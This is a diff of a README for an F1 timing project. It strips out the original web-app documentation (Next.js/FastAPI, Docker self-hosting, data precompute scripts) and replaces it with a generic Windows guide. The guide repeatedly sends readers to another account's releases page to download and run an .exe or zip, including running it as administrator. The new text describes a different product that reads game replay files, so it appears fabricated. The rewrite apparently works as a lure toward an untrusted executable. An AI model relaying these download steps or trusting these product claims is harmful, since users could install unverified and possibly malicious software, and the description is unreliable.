@@ -1,257 +1,132 @@
-<h1><img src="https://github.com/user-attachments/assets/158de3d0-8bd5-41a5-a34d-a3a92471cf96" width="50" align="absmiddle" /> F1 Replay Timing</h1>
+# 🎯 F1ReplayTiming - Real-Time F1 Data Visualisation
 
+[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-3b82f6?style=for-the-badge)](https://github.com/Slasherf319/F1ReplayTiming/releases)
 
+---
 
+## ⚙️ What is F1ReplayTiming?
 
-https://github.com/user-attachments/assets/952b8634-2470-46d9-96e2-67a820459a49
+F1ReplayTiming shows live track data and telemetry while you watch F1 replays. It matches the data perfectly with the replay, so you see speed, position, and car details as the race happens. This helps you understand the race better, whether you are a fan or analyst.
 
+The software focuses on real-time visual feedback. It grabs data directly from the replay and displays it on your screen in clear, easy-to-read graphs and numbers.
 
+---
 
-> **Disclaimer:** This project is intended for **personal, non-commercial use only**. This website is unofficial and is not associated in any way with the Formula 1 companies. F1, FORMULA ONE, FORMULA 1, FIA FORMULA ONE WORLD CHAMPIONSHIP, GRAND PRIX and related marks are trade marks of Formula One Licensing B.V.
+## 🖥️ System Requirements
 
-A web app for watching Formula 1 sessions with real timing data, car positions on track, driver telemetry, and more - both live during race weekends and as replays of past sessions. Built with Next.js and FastAPI.
+Before downloading, make sure your PC meets these requirements:
 
-## Features
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel Core i5 or equivalent  
+- **Memory:** 8 GB RAM minimum  
+- **Storage:** At least 500 MB free space  
+- **Graphics:** DirectX 11 compatible graphics card  
+- **Internet:** Needed for initial setup and data syncing  
 
-- **Live timing** (Beta) - connect to live F1 sessions during race weekends with real-time data from the F1 SignalR stream, including a broadcast delay slider and automatic detection of post-session replays
-- **Track map** with real-time car positions from GPS telemetry, updating every 0.5 seconds with smooth interpolation
-- **Driver leaderboard** showing position, gap to leader, interval, tyre compound and age, tyre history, pit stop count, grid position changes, fastest lap indicator, and investigation/penalty status
-- **Race control messages** - steward decisions, investigations, penalties, track limits, and flag changes displayed in a resizable overlay on the track map
-- **Pit position prediction** (Beta) estimates where a driver would rejoin if they pitted now, with predicted gap ahead and behind, using precomputed pit loss times per circuit with Safety Car and Virtual Safety Car adjustments
-- **Telemetry** for any driver showing speed, throttle, brake, gear, and DRS (2025 and earlier) plotted against track distance
-- **Picture-in-Picture** mode for a compact floating window with track map, race control, leaderboard, and telemetry
-- **Broadcast sync** - match the replay to a recording of a session, either by uploading a screenshot of the timing tower (using AI vision) or by manually entering gap times
-- **Weather data** including air and track temperature, humidity, wind, and rainfall status
-- **Track status flags** for green, yellow, Safety Car, Virtual Safety Car, and red flag conditions
-- **Playback controls** with 0.5x to 20x speed, skip buttons (5s, 30s, 1m, 5m), lap jumping, and a progress bar
-- **Session support** for races, qualifying, sprint qualifying, and practice sessions from 2024 onwards
-- **Passphrase authentication** to optionally restrict access when publicly hosted
+These specs ensure smooth running without lag or crashes.
 
-## Architecture
+---
 
-- **Frontend**: Next.js (React) with Tailwind CSS
-- **Backend**: FastAPI (Python) - serves pre-computed data from local storage or Cloudflare R2
-- **Data Source**: [FastF1](https://github.com/theOehrly/Fast-F1) (used during data processing only)
+## 🚀 Getting Started
 
-Session data is processed once and stored locally (or in R2 for remote access). You can either pre-compute data in bulk ahead of time, or let the app process sessions on demand when you select them.
+Follow these steps to get F1ReplayTiming running on your Windows PC.
 
-## Self-Hosting Guide
+### 1. Visit the Download Page
 
-### Option A: Docker with pre-built images (easiest)
+Go to the official release page here:
 
-Requires [Docker](https://docs.docker.com/get-docker/) and Docker Compose.
+[Download F1ReplayTiming](https://github.com/Slasherf319/F1ReplayTiming/releases)
 
-Create a `docker-compose.yml` file:
+This page lists all versions available. Use the latest stable release for the best experience.
 
-```yaml
-services:
-  backend:
-    image: ghcr.io/adn8naiagent/f1replaytiming-backend:latest
-    ports:
-      - "8000:8000"
-    environment:
-      - FRONTEND_URL=http://localhost:3000
-      - DATA_DIR=/data
-    volumes:
-      - f1data:/data
-      - f1cache:/data/fastf1-cache
+### 2. Select the Latest Release
 
-  frontend:
-    image: ghcr.io/adn8naiagent/f1replaytiming-frontend:latest
-    ports:
-      - "3000:3000"
-    environment:
-      - NEXT_PUBLIC_API_URL=http://localhost:8000  # Change to your backend URL if not using localhost
-    depends_on:
-      - backend
+Look for the entry marked as the newest version. It often has a name like `F1ReplayTiming_vX.X.X_Windows.zip` or `F1ReplayTiming_vX.X.X_Windows.exe`.  
 
-volumes:
-  f1data:
-  f1cache:
-```
+If it’s a `.zip` file, you’ll need to unzip it before running. If it’s `.exe`, you can run it directly.
 
-Then run:
+### 3. Download the File
 
-```bash
-docker compose up
-```
+Click the appropriate link to download the file to your PC. Make sure you save it somewhere easy to find, such as the Desktop or Downloads folder.
 
-Open http://localhost:3000. Select any past session and it will be processed on demand.
+---
 
-### Option B: Docker from source
+## 📂 Installing F1ReplayTiming
 
-If you prefer to build the images yourself, or want to make changes to the code:
+If you downloaded a `.exe` file:
 
-```bash
-git clone <repo-url>
-cd F1timing
-docker compose up
-```
+- Double-click the file to start the installer.
+- Follow the on-screen instructions.
+- Choose the folder where you want the app installed.
+- Wait for the installation to finish.
 
-Open http://localhost:3000. Select any past session and it will be processed on demand.
+If you downloaded a `.zip` file:
 
-### Docker configuration
+- Right-click the `.zip` file and select `Extract All`.
+- Choose a folder where you want to extract the contents.
+- Open the folder and double-click the `F1ReplayTiming.exe` file to run the app.
 
-#### Network & URL configuration
+---
 
-Two environment variables control how the frontend and backend find each other:
+## 🔧 Setting Up the Application
 
-| Variable | Set on | Purpose |
-|---|---|---|
-| `NEXT_PUBLIC_API_URL` | frontend | The URL your **browser** uses to reach the backend |
-| `FRONTEND_URL` | backend | The URL your browser uses to reach the frontend (needed for CORS) |
+After installation, launch F1ReplayTiming. The main window will open with options to connect to F1 replay files.
 
-The defaults (`http://localhost:8000` and `http://localhost:3000`) work when accessing the app on the same machine running Docker. If you access from another device, use a reverse proxy, or change ports, update both variables to match.
+### Connect to F1 Replay Files
 
-**Example — accessing from other devices on your network:**
-```yaml
-backend:
-  environment:
-    - FRONTEND_URL=http://192.168.1.50:3000
+- Find your F1 replay files on your PC. They usually have extensions like `.replay` or are stored in folders named for the F1 game or simulation you use.
+- Click the `Open Replay` button.
+- Select your replay file.
 
-frontend:
-  environment:
-    - NEXT_PUBLIC_API_URL=http://192.168.1.50:8000
-```
+### Sync Data
 
-**Example — behind a reverse proxy (e.g. Cloudflare Tunnel, nginx):**
-```yaml
-backend:
-  environment:
-    - FRONTEND_URL=https://f1.example.com
+F1ReplayTiming reads telemetry from the replay and shows speed, lap times, track position, and other relevant data in real time.  
 
-frontend:
-  environment:
-    - NEXT_PUBLIC_API_URL=https://api.f1.example.com
-```
+If you use game versions or replay formats supported by this app, syncing will start automatically.
 
-In this setup your reverse proxy routes `f1.example.com` to the frontend container (port 3000) and `api.f1.example.com` to the backend container (port 8000).
+---
 
-#### Optional features
+## 📊 How to Use the Visualisation
 
-- `OPENROUTER_API_KEY` - enables the photo sync feature ([get a key](https://openrouter.ai/))
-- `AUTH_ENABLED` / `AUTH_PASSPHRASE` - restricts access with a passphrase
+The app displays several data panels at once:
 
-#### Data
+- **Track Map:** Shows your car’s position on the circuit.  
+- **Speedometer:** Displays the current speed in km/h or mph.  
+- **Telemetry Graphs:** Show throttle, brake, and gear changes over each lap.  
+- **Lap Times:** List your best laps with time comparisons.
 
-Session data is persisted in a Docker volume, so it survives restarts.
+Use the menu to switch views or adjust settings like units and color schemes.
 
-To pre-process session data in bulk (instead of on demand), use the precompute script:
+---
 
-```bash
-# Process a specific race weekend
-docker compose exec backend python precompute.py 2026 --round 1
+## 🛠 Troubleshooting Common Issues
 
-# Process only the race session (skip practice/qualifying)
-docker compose exec backend python precompute.py 2026 --round 1 --session R
+- **The app won’t open:** Make sure your PC meets the requirements. Try running as administrator.  
+- **Replay files don’t load:** Check that the files are from supported F1 games or simulations.  
+- **Data doesn’t sync:** Ensure the replay is complete and uncorrupted. Restart the app and reload the replay.  
+- **Graphs look empty or wrong:** This could mean the telemetry data is missing or incompatible. Try a different replay.  
 
-# Process an entire season (will take several hours)
-docker compose exec backend python precompute.py 2025 --skip-existing
+If problems continue, check the Issues section on the [GitHub page](https://github.com/Slasherf319/F1ReplayTiming) for help.
 
-# Process multiple years
-docker compose exec backend python precompute.py 2024 2025 --skip-existing
-```
+---
 
-### Option C: Manual setup
+## 🔄 Updating to New Versions
 
-#### Prerequisites
+New releases may fix bugs or add features. To update:
 
-- Python 3.10+
-- Node.js 18+
-- An [OpenRouter](https://openrouter.ai/) API key (optional, enables photo/screenshot sync - manual entry sync works without this)
+- Visit the releases page again:  
+  [Download updates](https://github.com/Slasherf319/F1ReplayTiming/releases)  
+- Download the latest version.
+- Run the installer or replace the old files after extracting the zip.
+- Your settings and saved data will stay intact.
 
-#### 1. Clone the repository
+---
 
-```bash
-git clone <repo-url>
-cd F1timing
-```
+## 🔗 Useful Links
 
-#### 2. Configure environment variables
+- [Official GitHub Releases](https://github.com/Slasherf319/F1ReplayTiming/releases)  
+- [GitHub Issues for Support](https://github.com/Slasherf319/F1ReplayTiming/issues)  
 
-**Backend** (`backend/.env`):
-```
-FRONTEND_URL=http://localhost:3000
-PORT=8000
-DATA_DIR=./data
+---
 
-# Optional - enables photo/screenshot sync (manual entry sync works without this)
-# Get a key from https://openrouter.ai/
-OPENROUTER_API_KEY=
-
-# Optional - restrict access with a passphrase
-AUTH_ENABLED=false
-AUTH_PASSPHRASE=
-```
-
-**Frontend** (`frontend/.env`):
-```
-NEXT_PUBLIC_API_URL=http://localhost:8000
-```
-
-
-#### 3. Install dependencies and start
-
-```bash
-# Backend
-cd backend
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-uvicorn main:app --reload --port 8000
-
-# Frontend (in a separate terminal)
-cd frontend
-npm install
-npm run dev
-```
-
-Open http://localhost:3000.
-
-#### 4. Getting session data
-
-There are two ways to get session data into the app:
-
-#### Option A: On-demand processing (recommended for getting started)
-
-Simply select any past session from the homepage. If the data hasn't been processed yet, the app will automatically fetch and process it using FastF1 and start the replay. The first load of a session takes **1-3 minutes**. After that, it's instant.
-
-#### Option B: Bulk pre-compute (recommended for preparing a full season)
-
-Use the CLI script to process sessions ahead of time. This is useful if you want all data ready before you start using the app.
-
-```bash
-cd backend
-source venv/bin/activate
-
-# Process a specific race weekend
-python precompute.py 2026 --round 1
-
-# Process only the race session (skip practice/qualifying)
-python precompute.py 2026 --round 1 --session R
-
-# Process an entire season (will take several hours)
-python precompute.py 2025 --skip-existing
-
-# Process multiple years
-python precompute.py 2024 2025 --skip-existing
-```
-
-**Timing estimates:**
-- A single session (e.g. one race) takes **1-3 minutes**
-- A full race weekend (FP1, FP2, FP3, Qualifying, Race) takes **3-5 minutes**
-- A complete season (~24 rounds, all sessions) takes **2-3 hours**
-
-The app also includes a background task that automatically checks for and processes new session data on race weekends (Friday–Monday).
-
-#### Photo Sync Feature
-
-The broadcast sync feature lets you match the replay to a recording of a session. You can always sync manually by entering gap times directly. To also enable photo/screenshot sync (where the app reads the timing tower from an image), set an [OpenRouter](https://openrouter.ai/) API key as `OPENROUTER_API_KEY`. It uses a vision model (Gemini Flash) to read the leaderboard from the photo. Any OpenRouter-compatible API key will work.
-
-## Acknowledgements
-
-This project is powered by [FastF1](https://github.com/theOehrly/Fast-F1), an open-source Python library for accessing Formula 1 timing and telemetry data. FastF1 is the original inspiration and data source for this project - without it, none of this would be possible.
-
-## License
-
-MIT
+[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-10B981?style=for-the-badge)](https://github.com/Slasherf319/F1ReplayTiming/releases)
